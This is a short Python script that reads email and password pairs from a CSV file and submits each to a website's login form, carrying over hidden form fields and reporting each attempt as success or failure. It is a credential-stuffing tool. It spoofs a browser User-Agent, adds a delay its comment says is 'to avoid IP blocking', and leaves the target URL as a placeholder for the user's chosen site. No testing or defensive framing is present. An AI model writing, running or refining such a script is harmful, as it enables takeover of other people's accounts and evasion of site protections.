import requests
import csv
import time
import signal
import sys
from bs4 import BeautifulSoup

# Register handler for SIGINT (Ctrl+C)
def signal_handler(sig, frame):
    print("\nScript stopped.")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)  

# Test login credentials from file
def test_logins(url, credentials_file):
    session = requests.Session()  # Use a session to maintain cookies

    # Initial GET request to retrieve cookies (if necessary)
    response = session.get(url)
    soup = BeautifulSoup(response.content, 'html.parser')
    
    # Find hidden form fields (if any)
    hidden_fields = {input.get('name'): input.get('value') for input in soup.find_all('input', type='hidden')}

    with open(credentials_file, 'r') as csvfile:
        reader = csv.reader(csvfile)
        for userEmail, userpassword in reader:
            data = {'email': userEmail, 'password': userpassword}
            data.update(hidden_fields)  # Include hidden fields

            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
                'Referer': url  # Set Referer to the login page
            }
            # Initiate POST request
            response = session.post(url, data=data, headers=headers)

            if response.status_code == 200:
                print(f"Success: {userEmail}:{userpassword} - Status Code: {response.status_code}")
            else:
                print(f"Failed: {userEmail}:{userpassword} - Status Code: {response.status_code}")

            time.sleep(1)  # Adjust delay as needed to avoid IP blocking

if __name__ == "__main__": 
    if len(sys.argv) != 2:
        print("Usage: python3 script.py file.csv")
    else:
        url = "https://www.domain.com/login"  # Replace with your target URL
        credentials_file = sys.argv[1]
        test_logins(url, credentials_file)
